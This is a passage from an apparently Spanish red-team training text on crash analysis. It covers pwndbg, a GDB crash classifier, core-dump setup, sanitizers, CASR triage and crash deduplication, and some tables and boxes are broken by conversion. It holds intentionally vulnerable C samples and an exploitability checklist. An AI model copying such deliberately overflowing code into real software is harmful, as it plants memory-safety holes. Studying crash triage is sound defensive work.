<h1 id="o-usar-apport-para-ubuntu-centralizado">O usar apport para Ubuntu (centralizado)</h1>
<p>echo "/var/crash/core. %e. %p" | sudo tee /proc/sys/kernel/core_pattern</p>
<h1 id="verificar-configuracion">Verificar configuración</h1>
<p>cat /proc/sys/kernel/core_pattern
Comandos Esenciales de Pwndbg:
Comando
Propósito
Ejemplo
context
Mostrar contexto completo
context reg stack code
checksec
Verificar protecciones del binario</p>
<h3 id="na_8">N/A</h3>
<p>vmmap
Mapa de memoria del proceso
vmmap heap
telescope
Dereferencia inteligente de
memoria
telescope $rsp 20
cyclic
Generar/buscar patrones
cyclic 200 / cyclic -l
0x61616168
search
Buscar en memoria
search -s "FLAG"
heap
Análisis de chunks del heap
heap bins
vis_heap_chunks
Visualizar chunks</p>
<h3 id="na_9">N/A</h3>
<p>got
Mostrar GOT</p>
<h3 id="na_10">N/A</h3>
<p>plt
Mostrar PLT</p>
<h3 id="na_11">N/A</h3>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_8">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Comando
Propósito
Ejemplo
rop
Buscar gadgets ROP
rop --grep "pop rdi"
canary
Mostrar valor del canary</p>
<h3 id="na_12">N/A</h3>
<p>piebase
Base de PIE</p>
<h3 id="na_13">N/A</h3>
<p>procinfo
Información del proceso</p>
<h3 id="na_14">N/A</h3>
<p>Uso Típico para Análisis de Crash:
cd ~/crash_analysis_lab</p>
<h1 id="cargar-binario-con-crash-input">Cargar binario con crash input</h1>
<p>gdb -q ./vuln_no_protect</p>
<h1 id="en-gdbpwndbg">En GDB/Pwndbg:</h1>
<p>pwndbg&gt; set args 1 $(python3 -c "print('A'*100)")
pwndbg&gt; run</p>
<h1 id="despues-del-crash">Después del crash:</h1>
<p>pwndbg&gt; context
pwndbg&gt; bt</p>
<h1 id="backtrace">Backtrace</h1>
<p>pwndbg&gt; telescope $rsp 20</p>
<h1 id="examinar-stack">Examinar stack</h1>
<p>pwndbg&gt; x/20gx $rsp</p>
<h1 id="raw-dump-del-stack">Raw dump del stack</h1>
<p>pwndbg&gt; info reg</p>
<h1 id="todos-los-registros">Todos los registros</h1>
<p>pwndbg&gt; checksec</p>
<h1 id="verificar-protecciones">Verificar protecciones</h1>
<p>Script de Análisis Black‐Box ﴾GDB Python﴿:</p>
<h1 id="usrbinenv-python3">!/usr/bin/env python3</h1>
<h1 id="blackbox_analyzepy-analisis-automatizado-de-crashes">blackbox_analyze.py - Análisis automatizado de crashes</h1>
<h1 id="uso-gdb-q-x-blackbox_analyzepy-target">Uso: gdb -q -x blackbox_analyze.py ./target</h1>
<p>import gdb
import re
class CrashAnalyzer:
def <strong>init</strong>(self):
self.crash_info = {}
def analyze(self):</p>
<h1 id="ejecutar-hasta-crash">Ejecutar hasta crash</h1>
<p>gdb.execute("run", to_string=True)</p>
<h1 id="capturar-estado">Capturar estado</h1>
<p>self.crash_info['signal'] = self._get_signal()
self.crash_info['rip'] = self._get_reg('rip')
self.crash_info['rsp'] = self._get_reg('rsp')
self.crash_info['backtrace'] = self._get_backtrace()</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_9">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="clasificar">Clasificar</h1>
<p>self._classify()
self._print_report()
def _get_signal(self):
try:
output = gdb.execute("info signal", to_string=True)
for line in output.split('\n'):
if 'received' in line.lower():
return line.strip()
except:
pass
return "UNKNOWN"
def _get_reg(self, reg):
try:
return int(gdb.parse_and_eval(f"${reg}"))
except:
return 0
def _get_backtrace(self):
try:
return gdb.execute("bt 10", to_string=True)
except:
return "No backtrace available"
def _classify(self):
rip = self.crash_info['rip']
if rip &lt; 0x1000:
self.crash_info['type'] = "NULL_POINTER_DEREF"
self.crash_info['severity'] = "LOW"
elif rip &gt; 0x7fffffffffff:
self.crash_info['type'] = "RIP_CORRUPTION"
self.crash_info['severity'] = "CRITICAL"
elif 0x41414141 &lt;= rip &lt;= 0x4141414141414141:
self.crash_info['type'] = "RIP_CONTROL_PATTERN"
self.crash_info['severity'] = "CRITICAL"
else:
self.crash_info['type'] = "MEMORY_CORRUPTION"
self.crash_info['severity'] = "HIGH"
def _print_report(self):
print("\n" + "="<em>60)
print("CRASH ANALYSIS REPORT")
print("="</em>60)
print(f"Type:
{self.crash_info.get('type', 'UNKNOWN')}")
print(f"Severity: {self.crash_info.get('severity', 'UNKNOWN')}")</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_10">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
print(f"RIP:
0x{self.crash_info.get('rip', 0):x}")
print(f"RSP:
0x{self.crash_info.get('rsp', 0):x}")
print(f"Signal:
{self.crash_info.get('signal', 'UNKNOWN')}")
print("-"<em>60)
print("BACKTRACE:")
print(self.crash_info.get('backtrace', 'N/A'))
print("="</em>60)</p>
<h1 id="ejecutar-analisis">Ejecutar análisis</h1>
<p>if <strong>name</strong> == "<strong>main</strong>":
analyzer = CrashAnalyzer()
analyzer.analyze()</p>
<h3 id="523">5.2.3.</h3>
<h3 id="423-coleccion-de-dumps">4.2.3 Colección de Dumps</h3>
<p>Windows ‐ Windows Error Reporting ﴾WER﴿y ProcDump:</p>
<h1 id="configurar-wer-para-guardar-dumps">Configurar WER para guardar dumps</h1>
<p>reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EX
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWOR</p>
<h1 id="usar-procdump-para-captura-especifica">Usar ProcDump para captura específica</h1>
<h1 id="descargar-de-httpsdocsmicrosoftcomen-ussysinternalsdownloadsprocdump">Descargar de: https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</h1>
<h1 id="capturar-dump-en-crash">Capturar dump en crash</h1>
<p>procdump -e -ma target.exe -o C:\Dumps</p>
<h1 id="capturar-dump-en-excepcion-especifica">Capturar dump en excepción específica</h1>
<p>procdump -e 1 -f "Access Violation" target.exe
Linux ‐ Core Dumps y Systemd:</p>
<h1 id="verificar-estado-actual">Verificar estado actual</h1>
<p>cat /proc/sys/kernel/core_pattern
ulimit -c</p>
<h1 id="configuracion-persistente">Configuración persistente</h1>
<p>echo "kernel.core_pattern=/var/crash/core. %e. %p. %t" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p</p>
<h1 id="para-systemd-coredump">Para systemd-coredump</h1>
<p>sudo apt install systemd-coredump
echo "kernel.core_pattern=|/lib/systemd/systemd-coredump %P %u %g %s %t %c %h" | sudo tee /etc/sysctl.d/</p>
<h1 id="listar-cores-con-coredumpctl">Listar cores con coredumpctl</h1>
<p>coredumpctl list
coredumpctl info MATCH
coredumpctl debug MATCH</p>
<h1 id="abre-gdb-directamente">Abre GDB directamente</h1>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_11">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="script-de-batch-collection">Script de batch collection</h1>
<p>for input in crashes/<em>; do
timeout 5 ./target "$input" || {
mv core.</em> "cores/$(basename $input).core" 2&gt;/dev/null
}
done</p>
<h3 id="524">5.2.4.</h3>
<h3 id="424-pageheap-y-appverifier-windows">4.2.4 PageHeap y AppVerifier ﴾Windows﴿</h3>
<p>PageHeap coloca páginas de guarda alrededor de allocaciones para detectar heap overflows inme‐
diatamente.</p>
<h1 id="habilitar-pageheap-para-un-ejecutable">Habilitar PageHeap para un ejecutable</h1>
<p>gflags /p /enable target.exe /full</p>
<h1 id="verificar-estado">Verificar estado</h1>
<p>gflags /p</p>
<h1 id="deshabilitar">Deshabilitar</h1>
<p>gflags /p /disable target.exe</p>
<h1 id="con-appverifier-gui-mas-completo">Con AppVerifier (GUI más completo)</h1>
<p>appverif.exe</p>
<h1 id="agregar-aplicacion-seleccionar-checks-heaps-handles-locks">Agregar aplicación →Seleccionar checks (Heaps, Handles, Locks)</h1>
<p>Ejemplo de Detección con PageHeap:
// heap_vuln.c - Heap overflow detectable con PageHeap</p>
<h1 id="include_3">include <windows.h></h1>
<h1 id="include_4">include <stdio.h></h1>
<p>int main() {
char <em>buf = (char</em>)HeapAlloc(GetProcessHeap(), 0, 16);
printf("[*] Allocated 16 bytes at
%p\n", buf);
// Este overflow es detectado INMEDIATAMENTE con PageHeap
strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAA");
// 25 bytes &gt; 16
HeapFree(GetProcessHeap(), 0, buf);
return 0;
}
Sin PageHeap: El overflow corrompe silenciosamente el heap. Con PageHeap: Crash inmediato
en STATUS_ACCESS_VIOLATION al escribir más allá del buffer.</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_12">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="53">5.3.</h3>
<h3 id="43-sanitizadores-de-memoria">4.3 Sanitizadores de Memoria</h3>
<p>Los sanitizers son herramientas de instrumentación que detectan bugs de memoria en tiempo de
ejecución. Son esenciales para análisis de crashes porque convierten bugs silenciosos en crashes
informativos.</p>
<h3 id="531">5.3.1.</h3>
<h3 id="431-addresssanitizer-asan">4.3.1 AddressSanitizer ﴾ASAN﴿</h3>
<p>ASAN es el sanitizer más importante para análisis de seguridad. Detecta múltiples clases de bugs
con overhead moderado ﴾~2x slowdown﴿.
Compilación con ASAN:</p>
<h3 id="gcc"># GCC</h3>
<p>gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan</p>
<h1 id="clang-recomendado-para-mejor-reporting">Clang (recomendado para mejor reporting)</h1>
<p>clang -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan</p>
<h1 id="msvc-visual-studio-2019-169">MSVC (Visual Studio 2019 16.9+)</h1>
<p>cl /fsanitize=address /Zi source.c
Configuración de Runtime ﴾ASAN_OPTIONS﴿:
export ASAN_OPTIONS="\
abort_on_error=1:\
symbolize=1:\
detect_leaks=1:\
detect_stack_use_after_return=1:\
detect_stack_use_after_scope=1:\
check_initialization_order=1:\
strict_init_order=1:\
print_stats=1:\
halt_on_error=1:\
quarantine_size_mb=256:\
malloc_context_size=30:\
print_legend=true:\
print_scariness=true"
Tipos de Errores Detectados por ASAN:
Error
Descripción
Ejemplo
heap‐buffer‐overflow
Escritura/lectura fuera de bounds en heap
buf[size+1] = 'x'
stack‐buffer‐overflow
Overflow de buffer en stack
char buf[10]; buf[20]=0;
global‐buffer‐
overflow
Overflow de variable global
Similar
heap‐use‐after‐free
Acceso a memoria liberada
free(p); *p=0;
stack‐use‐after‐return
Acceso a stack después de return
Puntero a local escapado
stack‐use‐after‐scope
Acceso fuera del scope
Variable local fuera de
bloque</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_13">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Error
Descripción
Ejemplo
double‐free
Liberar memoria dos veces
free(p); free(p);
alloc‐dealloc‐
mismatch
malloc/delete o new/free
free(new int)
SEGV on unknown
address
Crash en dirección inválida
NULL deref
Ejemplo de Reporte ASAN ﴾Heap Buffer Overflow﴿:</p>
<p>==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000050
READ of size 1 at 0x602000000050 thread T0</p>
<h1 id="0-0x4011a3-in-heap_overflow-homeuservulnerable_suitec185">0 0x4011a3 in heap_overflow /home/user/vulnerable_suite.c:18:5</h1>
<h1 id="1-0x4012b8-in-main-homeuservulnerable_suitec459">1 0x4012b8 in main /home/user/vulnerable_suite.c:45:9</h1>
<h1 id="2-0x7f">2 0x7f...</h1>
<p>in __libc_start_main
0x602000000050 is located 0 bytes to the right of 32-byte region [0x602000000030,0x602000000050)
allocated by thread T0 here:</p>
<h1 id="0-0x7f">0 0x7f...</h1>
<p>in malloc</p>
<h1 id="1-0x401156-in-heap_overflow-homeuservulnerable_suitec1517">1 0x401156 in heap_overflow /home/user/vulnerable_suite.c:15:17</h1>
<p>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user/vulnerable_suite.c:18:5 in heap_overflow
Interpretando Shadow Memory:
ASAN usa “shadow memory” para rastrear el estado de cada byte:
Shadow byte legend:
Addressable:</p>
<p>Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:
fa
Freed heap region:
fd
Stack left redzone:
f1
Stack mid redzone:
f2
Stack right redzone:
f3
Stack after return:
f5
Stack use after scope:
f8
Global redzone:
f9
Global init order:
f6
Poisoned by user:
f7
Container overflow:
fc
Array cookie:
ac
Intra object redzone:
bb
ASan internal:
fe
Left alloca redzone:
ca
Right alloca redzone:
cb</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_14">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="532">5.3.2.</h3>
<h3 id="432-undefinedbehaviorsanitizer-ubsan">4.3.2 UndefinedBehaviorSanitizer ﴾UBSAN﴿</h3>
<p>UBSAN detecta comportamiento indefinido en C/C++ que puede causar bugs sutiles.</p>
<h1 id="compilacion-con-ubsan">Compilación con UBSAN</h1>
<p>gcc -g -O1 -fsanitize=undefined source.c -o target_ubsan</p>
<h1 id="combinado-con-asan-recomendado">Combinado con ASAN (recomendado)</h1>
<p>gcc -g -O1 -fsanitize=address,undefined source.c -o target_asan_ubsan
Errores Detectados:
// signed-integer-overflow
int a = INT_MAX;
int b = a + 1;
// UBSAN: runtime error
// null-pointer-dereference
int <em>p = NULL;
</em>p = 42;
// UBSAN: runtime error
// shift-out-of-bounds
int x = 1 &lt;&lt; 33;
// UBSAN: shift exponent 33 is too large
// float-cast-overflow
double d = 1e100;
int i = (int)d;
// UBSAN: value cannot be represented</p>
<h3 id="533">5.3.3.</h3>
<h3 id="433-memorysanitizer-msan">4.3.3 MemorySanitizer ﴾MSAN﴿</h3>
<p>MSAN detecta lecturas de memoria no inicializada ﴾solo Clang﴿.</p>
<h1 id="requiere-clang-y-libc-instrumentada">Requiere Clang y libc++ instrumentada</h1>
<p>clang -g -O1 -fsanitize=memory -fno-omit-frame-pointer source.c -o target_msan
Ejemplo de Error:
int main() {
int x;
// No inicializada
if (x)
// MSAN: use-of-uninitialized-value
printf("branch taken\n");
return 0;
}</p>
<h3 id="534">5.3.4.</h3>
<h3 id="434-threadsanitizer-tsan">4.3.4 ThreadSanitizer ﴾TSAN﴿</h3>
<p>TSAN detecta data races y deadlocks en programas multi‐hilo.</p>
<h1 id="compilacion-con-tsan">Compilación con TSAN</h1>
<p>gcc -g -O1 -fsanitize=thread source.c -lpthread -o target_tsan
Ejemplo de Data Race:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_15">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="include_5">include <pthread.h></h1>
<p>int counter = 0;
void<em> increment(void</em> arg) {
for (int i = 0; i &lt; 1000000; i++)
counter++;
// TSAN: data race
return NULL;
}
int main() {
pthread_t t1, t2;
pthread_create(&amp;t1, NULL, increment, NULL);
pthread_create(&amp;t2, NULL, increment, NULL);
pthread_join(t1, NULL);
pthread_join(t2, NULL);
return 0;
}
Reporte TSAN:
WARNING: ThreadSanitizer: data race
Write of size 4 at 0x... by thread T1:</p>
<h1 id="0-increment-sourcec7-target_tsan0x">0 increment source.c:7 (target_tsan+0x...)</h1>
<p>Previous write of size 4 at 0x... by thread T2:</p>
<h1 id="0-increment-sourcec7-target_tsan0x_1">0 increment source.c:7 (target_tsan+0x...)</h1>
<h3 id="535">5.3.5.</h3>
<h3 id="435-matriz-de-compatibilidad-de-sanitizers">4.3.5 Matriz de Compatibilidad de Sanitizers</h3>
<p>Sanitizer</p>
<h3 id="gcc_1">GCC</h3>
<p>Clang</p>
<h3 id="msvc">MSVC</h3>
<p>Linux
Windows
macOS</p>
<h3 id="asan_5">ASAN</h3>
<p>￿
￿
￿
￿
￿
￿</p>
<h3 id="ubsan_1">UBSAN</h3>
<p>￿
￿
￿
￿
￿
￿</p>
<h3 id="msan">MSAN</h3>
<p>￿
￿
￿
￿
￿
￿</p>
<h3 id="tsan_1">TSAN</h3>
<p>￿
￿
￿
￿
￿
￿
Combinaciones Válidas:
Combinación
Válida
Uso</p>
<h3 id="asan-ubsan">ASAN + UBSAN</h3>
<p>￿
Triage de fuzzing general</p>
<h3 id="asan-lsan">ASAN + LSAN</h3>
<p>￿
Incluido por defecto con ASAN</p>
<h3 id="asan-msan">ASAN + MSAN</h3>
<p>￿
Incompatibles</p>
<h3 id="asan-tsan">ASAN + TSAN</h3>
<p>￿
Incompatibles</p>
<h3 id="msan-ubsan">MSAN + UBSAN</h3>
<p>￿
Bugs de inicialización</p>
<h3 id="tsan-ubsan">TSAN + UBSAN</h3>
<p>￿
Bugs de concurrencia</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_16">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="536">5.3.6.</h3>
<h3 id="436-gwpasan-para-produccion">4.3.6 GWP‐ASan para Producción</h3>
<p>GWP‐ASan ﴾Google‐Wide Performance‐safe ASan﴿es un sampling allocator que detecta bugs de
memoria en producción con overhead mínimo ﴾~1‐2 %﴿.
// Integración en Android (automática en Android 11+)
// En Linux, usar con jemalloc o tcmalloc
// Configurar sampling rate
export GWP_ASAN_SAMPLE_RATE=5000
// 1 de cada 5000 allocations
// Ejemplo de crash en producción
==12345==ERROR: GWP-ASan detected a memory error
Use-after-free at 0x7f1234567890
Allocation stack:</p>
<h1 id="0-malloc">0 malloc ...</h1>
<h1 id="1-create_widget-appc42">1 create_widget app.c:42</h1>
<p>Deallocation stack:</p>
<h1 id="0-free">0 free ...</h1>
<h1 id="1-destroy_widget-appc78">1 destroy_widget app.c:78</h1>
<p>Access stack:</p>
<h1 id="0-update_widget-appc120">0 update_widget app.c:120</h1>
<p>Cuándo Usar Cada Sanitizer:
┌──────────────────────────────────────────────────────────────┐
│</p>
<h3 id="seleccion-de-sanitizer">SELECCIÓN DE SANITIZER</h3>
<p>│
├──────────────────────────────────────────────────────────────┤
│
│
│
Fuzzing/Triage ──────────►ASAN + UBSAN
│
│
│
│
│
└──►Bugs de concurrencia ──────►TSAN + UBSAN
│
│
│
│
│
└──►Bugs de inicialización ──►MSAN + UBSAN
│
│
│
│
Producción ─────────────►GWP-ASan (sampling)
│
│
│
│
Kernel Linux ───────────►KASAN / KMSAN / KCSAN
│
│
│
└──────────────────────────────────────────────────────────────┘</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_17">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="54">5.4.</h3>
<h3 id="44-clasificacion-y-triage-automatizado">4.4 Clasificación y Triage Automatizado</h3>
<h3 id="541">5.4.1.</h3>
<h3 id="441-casr-crash-analysis-and-severity-reporter">4.4.1 CASR ‐ Crash Analysis and Severity Reporter</h3>
<p>CASR es una suite de herramientas para clasificación automatizada de crashes, desarrollada por ISP</p>
<h3 id="ras">RAS.</h3>
<p>Instalación:</p>
<h1 id="desde-cratesio-rust">Desde crates.io (Rust)</h1>
<p>cargo install casr</p>
<h1 id="o-desde-source">O desde source</h1>
<p>git clone https://github.com/ispras/casr
cd casr
cargo build --release
sudo cp target/release/casr-* /usr/local/bin/</p>
<h1 id="componentes-disponibles">Componentes disponibles:</h1>
<h1 id="-casr-san-procesa-crashes-de-binarios-con-sanitizers">- casr-san: Procesa crashes de binarios con sanitizers</h1>
<h1 id="-casr-gdb-procesa-crashes-con-gdb-sin-sanitizers">- casr-gdb: Procesa crashes con GDB (sin sanitizers)</h1>
<h1 id="-casr-core-analiza-core-dumps">- casr-core: Analiza core dumps</h1>
<h1 id="-casr-cluster-agrupa-crashes-similares">- casr-cluster: Agrupa crashes similares</h1>
<h1 id="-casr-cli-interfaz-de-linea-de-comandos">- casr-cli: Interfaz de línea de comandos</h1>
<p>Uso de CASR para Triage:
cd ~/crash_analysis_lab</p>
<h1 id="1-generar-reporte-para-crash-individual-con-asan">1. Generar reporte para crash individual (con ASAN)</h1>
<p>casr-san -o crash.casrep -- ./vuln_asan 1 "$(python3 -c 'print(\"A\"*100)')"</p>
<h1 id="2-generar-reporte-sin-sanitizers-usa-gdb">2. Generar reporte sin sanitizers (usa GDB)</h1>
<p>casr-gdb -o crash_gdb.casrep -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
<h1 id="3-procesar-corpus-de-crashes-de-fuzzer">3. Procesar corpus de crashes de fuzzer</h1>
<p>mkdir -p casrep_out
for crash in crashes/*; do
name=$(basename "$crash")
casr-san -o "casrep_out/${name}.casrep" -- ./target_asan "$(cat $crash)" 2&gt;/dev/null || true
done</p>
<h1 id="4-clustering-de-crashes">4. Clustering de crashes</h1>
<p>casr-cluster -c casrep_out/ deduped_out/</p>
<h1 id="5-ver-resumen-de-clusters">5. Ver resumen de clusters</h1>
<p>for cluster in deduped_out/cl<em>; do
count=$(ls -1 "$cluster"/</em>.casrep 2&gt;/dev/null | wc -l)
first=$(ls "$cluster"/*.casrep 2&gt;/dev/null | head -1)
if [ -f "$first" ]; then</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_18">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
severity=$(jq -r '.CrashSeverity.Type' "$first")
desc=$(jq -r '.CrashSeverity.ShortDescription' "$first")
echo "$(basename $cluster): $count crashes - $severity - $desc"
fi
done
Estructura de Reporte CASR ﴾.casrep﴿:
{
"CrashSeverity": {
"Type": "EXPLOITABLE",
"ShortDescription": "heap-buffer-overflow(write)",
"Description": "Write to heap buffer out of bounds"
},
"Stacktrace": [
"#0 0x401156 in heap_overflow vulnerable_suite.c:18",
"#1 0x4012b8 in main vulnerable_suite.c:45",
"#2 0x7f... in __libc_start_main"
],
"CrashLine": "vulnerable_suite.c:18",
"ExecutionClass": {
"FaultAddress": "0x602000000050",
"AccessType": "WRITE"
},
"AsanReport": {
"ErrorType": "heap-buffer-overflow",
"AccessSize": 1,
"AccessAddress": "0x602000000050"
}
}</p>
<h3 id="542">5.4.2.</h3>
<h3 id="442-clases-de-severidad-de-casr">4.4.2 Clases de Severidad de CASR</h3>
<p>CASR clasifica crashes en 23 clases de severidad:
Clase
Tipo
Descripción</p>
<h3 id="exploitable">EXPLOITABLE</h3>
<p>SegFaultOnPc</p>
<h3 id="e">E</h3>
<p>SIGSEGV con PC corrompido
ReturnAv</p>
<h3 id="e_1">E</h3>
<p>Violación de acceso en return
BranchAv</p>
<h3 id="e_2">E</h3>
<p>Violación de acceso en branch
CallAv</p>
<h3 id="e_3">E</h3>
<p>Violación de acceso en call
DestAv</p>
<h3 id="e_4">E</h3>
<p>Violación de acceso en escritura
heap‐buffer‐overflow﴾write﴿</p>
<h3 id="e_5">E</h3>
<p>ASAN: overflow de heap escritura
stack‐buffer‐overflow﴾write﴿</p>
<h3 id="e_6">E</h3>
<p>ASAN: overflow de stack escritura
heap‐use‐after‐free﴾write﴿</p>
<h3 id="e_7">E</h3>
<p>ASAN: UAF escritura</p>
<h3 id="probably_exploitable">PROBABLY_EXPLOITABLE</h3>
<p>SourceAv</p>
<h3 id="pe">PE</h3>
<p>Violación de acceso en lectura
SegFaultOnPcNearNull</p>
<h3 id="pe_1">PE</h3>
<p>SIGSEGV en PC cerca de NULL</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_19">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Clase
Tipo
Descripción
DestAvNearNull</p>
<h3 id="pe_2">PE</h3>
<p>Escritura cerca de NULL mapping
heap‐buffer‐overflow﴾read﴿</p>
<h3 id="pe_3">PE</h3>
<p>ASAN: overflow de heap lectura
heap‐use‐after‐free﴾read﴿</p>
<h3 id="pe_4">PE</h3>
<p>ASAN: UAF lectura</p>
<h3 id="not_exploitable">NOT_EXPLOITABLE</h3>
<p>AbortSignal</p>
<h3 id="ne">NE</h3>
<p>SIGABRT ﴾assertion, abort﴿
SafeFunctionCheck</p>
<h3 id="ne_1">NE</h3>
<p>Stack protector triggered
double‐free</p>
<h3 id="ne_2">NE</h3>
<p>ASAN: double free
SourceAvNearNull</p>
<h3 id="ne_3">NE</h3>
<p>Lectura cerca de NULL
alloc‐dealloc‐mismatch</p>
<h3 id="ne_4">NE</h3>
<p>malloc/delete mismatch</p>
<h3 id="543">5.4.3.</h3>
<h3 id="443-checklist-de-triage-rapido">4.4.3 Checklist de Triage Rápido</h3>
<p>┌──────────────────────────────────────────────────────────────────────────┐
│</p>
<h3 id="checklist-de-triage-rapido">CHECKLIST DE TRIAGE RÁPIDO</h3>
<p>│
├──────────────────────────────────────────────────────────────────────────┤
│
│</p>
<h3 id="1-reproducibilidad">│1. REPRODUCIBILIDAD</h3>
<p>│
│
[ ] Crash se reproduce 10/10 veces
│
│
[ ] Crash requiere condiciones específicas (timing, memory layout)
│
│
[ ] Usar rr/TTD si no es determinístico
│
│
│</p>
<h3 id="2-tipo-de-crash">│2. TIPO DE CRASH</h3>
<p>│
│
[ ] Stack corruption (canary tripped, RIP overwrite)
│
│
[ ] Heap corruption (UAF, double-free, overflow)
│
│
[ ] NULL dereference
│
│
[ ] Integer overflow →memory corruption
│
│
[ ] Format string
│
│
│</p>
<h3 id="3-control-del-atacante">│3. CONTROL DEL ATACANTE</h3>
<p>│
│
[ ] ¿Controla RIP/EIP directamente?
│
│
[ ] ¿Controla datos escritos?
│
│
[ ] ¿Controla dirección de escritura?
│
│
[ ] ¿Controla tamaño de operación?
│
│
[ ] ¿Puede obtener info leak primero?
│
│
│</p>
<h3 id="4-mitigaciones">│4. MITIGACIONES</h3>
<p>│
│
[ ] checksec --file target
│
│
[ ] ASLR: ON/OFF (cat /proc/sys/kernel/randomize_va_space)
│
│</p>
<h3 id="depnx-onoff">[ ] DEP/NX: ON/OFF</h3>
<p>│
│
[ ] Stack Canary: ON/OFF
│
│</p>
<h3 id="pie-onoff">[ ] PIE: ON/OFF</h3>
<p>│
│
[ ] RELRO: Full/Partial/No
│</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_20">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
│</p>
<h3 id="cfi-onoff">[ ] CFI: ON/OFF</h3>
<p>│
│
[ ] CET (Intel): ON/OFF
│
│
│</p>
<h3 id="5-alcanzabilidad">│5. ALCANZABILIDAD</h3>
<p>│
│
[ ] ¿Cómo se alcanza el código vulnerable desde input externo?
│
│
[ ] ¿Requiere autenticación?
│
│
[ ] ¿Es alcanzable remotamente?
│
│
[ ] ¿Qué privilegios se requieren?
│
│
│
└──────────────────────────────────────────────────────────────────────────┘
Verificación de Mitigaciones con checksec:</p>
<h1 id="linux-con-checksec-de-pwntools">Linux con checksec de pwntools</h1>
<p>checksec --file ./target</p>
<h1 id="salida-tipica">Salida típica:</h1>
<h1 id="_1"></h1>
<p>Arch:
amd64-64-little</p>
<h1 id="_2"></h1>
<h2 id="relro">RELRO:</h2>
<p>Partial RELRO</p>
<h1 id="_3"></h1>
<p>Stack:
No canary found</p>
<h1 id="_4"></h1>
<h2 id="nx">NX:</h2>
<p>NX enabled</p>
<h1 id="_5"></h1>
<h2 id="pie">PIE:</h2>
<p>No PIE (0x400000)</p>
<h1 id="windows-con-winchecksec">Windows con winchecksec</h1>
<p>winchecksec.exe target.exe</p>
<h1 id="verificar-cet-intel-control-flow-enforcement-technology">Verificar CET (Intel Control-flow Enforcement Technology)</h1>
<p>readelf -n target | grep -i "IBT|SHSTK"</p>
<h1 id="verificar-arm-pacbti">Verificar ARM PAC/BTI</h1>
<p>readelf -n target | grep -i "PAC|BTI"</p>
<h3 id="544">5.4.4.</h3>
<h3 id="444-deduplicacion-de-crashes">4.4.4 Deduplicación de Crashes</h3>
<p>Cuando un fuzzer produce miles de crashes, la deduplicación es esencial para enfocarse en bugs
únicos.
Método 1: Hash de Stack Trace</p>
<h1 id="binbash">!/bin/bash</h1>
<h1 id="dedupe_by_stacksh-deduplicacion-por-hash-de-top-3-frames">dedupe_by_stack.sh - Deduplicación por hash de top 3 frames</h1>
<p>CRASHES_DIR="crashes"
DEDUPED_DIR="deduped_stack"
mkdir -p "$DEDUPED_DIR"
declare -A seen_hashes
for crash in "$CRASHES_DIR"/*; do</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_21">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="ejecutar-y-capturar-backtrace">Ejecutar y capturar backtrace</h1>
<p>bt=$(gdb -q -batch \
-ex "run" \
-ex "bt 3" \
--args ./target_asan "$(cat $crash)" 2&gt;&amp;1 | grep -E "^#[0-3]")</p>
<h1 id="normalizar-remover-direcciones-solo-funciones">Normalizar (remover direcciones, solo funciones)</h1>
<p>normalized=$(echo "$bt" | sed 's/0x[0-9a-f]*//g' | tr -d ' \n')</p>
<h1 id="hash">Hash</h1>
<p>hash=$(echo "$normalized" | md5sum | cut -d' ' -f1)
if [[ -z "${seen_hashes[$hash]}" ]]; then
seen_hashes[$hash]=1
cp "$crash" "$DEDUPED_DIR/"
echo "UNIQUE: $(basename $crash) - $hash"
else
echo "DUPE: $(basename $crash)"
fi
done
echo "Reduced $(ls $CRASHES_DIR | wc -l) crashes to $(ls $DEDUPED_DIR | wc -l) unique"
Método 2: Deduplicación por Cobertura</p>
<h1 id="binbash_1">!/bin/bash</h1>
<h1 id="dedupe_by_coveragesh-usa-afl-showmap-para-deduplicar-por-cobertura">dedupe_by_coverage.sh - Usa afl-showmap para deduplicar por cobertura</h1>
